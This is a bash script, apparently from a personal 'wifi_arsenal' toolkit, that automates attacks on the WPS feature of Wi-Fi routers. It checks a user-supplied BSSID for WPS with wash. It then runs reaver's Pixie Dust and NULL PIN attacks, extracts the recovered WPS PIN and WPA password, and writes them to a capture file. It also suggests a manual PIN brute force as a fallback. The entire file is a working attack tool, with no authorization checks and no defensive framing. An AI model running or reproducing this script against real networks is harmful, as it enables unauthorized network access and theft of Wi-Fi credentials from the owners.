#!/bin/bash
# WPS Attack Suite - Pixie Dust, NULL PIN, and optional PIN brute force
# Usage: ./attack_wps.sh <BSSID> <CHANNEL> <SSID>

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./attack_wps.sh <BSSID> <CHANNEL> <SSID>"
    echo "Example: ./attack_wps.sh 30:68:93:AC:96:AD 6 hackme"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_FILE="$CAPTURE_DIR/AP=${SAFE_SSID}_$TIMESTAMP.wps"

echo "[*] METHOD 2: WPS ATTACKS"
echo "[*] Targeting: $BSSID on channel $CHANNEL"
echo ""

# Ensure alfa0 is in monitor mode
echo "[*] Setting alfa0 to monitor mode..."
$SCRIPT_DIR/mode_manager.sh ensure alfa0 monitor

if [ $? -ne 0 ]; then
    echo "[-] Failed to set monitor mode"
    exit 1
fi

# Check if WPS is enabled on target
echo "[*] Checking WPS status with wash..."
sudo timeout 10 wash -i alfa0 -c $CHANNEL 2>/dev/null | grep -i "$BSSID" > /tmp/wps_check.tmp

if [ ! -s /tmp/wps_check.tmp ]; then
    echo "[-] FAILED: WPS not detected on target"
    echo "    Router either has WPS disabled or not responding"
    rm -f /tmp/wps_check.tmp
    exit 1
fi

WPS_INFO=$(cat /tmp/wps_check.tmp)
echo "[+] WPS ENABLED on target!"
echo "$WPS_INFO"
echo ""

# Try Pixie Dust attack first (fast, ~30% success rate)
echo "[*] Attempting Pixie Dust attack..."
echo "[*] This exploits weak random number generation in some WPS implementations"
echo ""

sudo timeout 45 reaver -i alfa0 -b "$BSSID" -c "$CHANNEL" -vvv -K 1 -N -d 0 -T 1 -t 2 -L 2>&1 | tee /tmp/reaver_pixie.log

# Check if Pixie Dust succeeded
if grep -q "WPS PIN:" /tmp/reaver_pixie.log; then
    WPS_PIN=$(grep "WPS PIN:" /tmp/reaver_pixie.log | tail -1 | awk '{print $3}')
    WPA_PSK=$(grep "WPA PSK:" /tmp/reaver_pixie.log | tail -1 | cut -d':' -f2- | xargs)
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "[+] SUCCESS: PIXIE DUST ATTACK WORKED!" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "Network: $SSID" | tee -a "$OUTPUT_FILE"
    echo "BSSID: $BSSID" | tee -a "$OUTPUT_FILE"
    echo "WPS PIN: $WPS_PIN" | tee -a "$OUTPUT_FILE"
    echo "WPA PASSWORD: $WPA_PSK" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "Result saved to: $OUTPUT_FILE"
    
    rm -f /tmp/reaver_pixie.log /tmp/wps_check.tmp
    exit 0
fi

echo "[-] Pixie Dust attack failed"
echo ""

# Try NULL PIN attack (instant, ~5% success rate)
echo "[*] Attempting NULL PIN attack..."
echo "[*] Some routers accept empty PIN"
echo ""

sudo timeout 20 reaver -i alfa0 -b "$BSSID" -c "$CHANNEL" -p "" -vvv -N -d 0 -T 1 -t 2 -L 2>&1 | tee /tmp/reaver_null.log

# Check if NULL PIN succeeded
if grep -q "WPS PIN:" /tmp/reaver_null.log; then
    WPA_PSK=$(grep "WPA PSK:" /tmp/reaver_null.log | tail -1 | cut -d':' -f2- | xargs)
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "[+] SUCCESS: NULL PIN ATTACK WORKED!" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "Network: $SSID" | tee -a "$OUTPUT_FILE"
    echo "BSSID: $BSSID" | tee -a "$OUTPUT_FILE"
    echo "WPS PIN: (empty)" | tee -a "$OUTPUT_FILE"
    echo "WPA PASSWORD: $WPA_PSK" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "Result saved to: $OUTPUT_FILE"
    
    rm -f /tmp/reaver_null.log /tmp/reaver_pixie.log /tmp/wps_check.tmp
    exit 0
fi

echo "[-] NULL PIN attack failed"
echo ""
echo "[-] FAILED: Both quick WPS attacks failed"
echo "    Pixie Dust and NULL PIN unsuccessful"
echo ""
echo "NOTE: PIN brute force available but takes 2-10 hours"
echo "      Use 'reaver -i alfa0 -b $BSSID -c $CHANNEL -vv' manually if needed"

rm -f /tmp/reaver_null.log /tmp/reaver_pixie.log /tmp/wps_check.tmp
exit 1
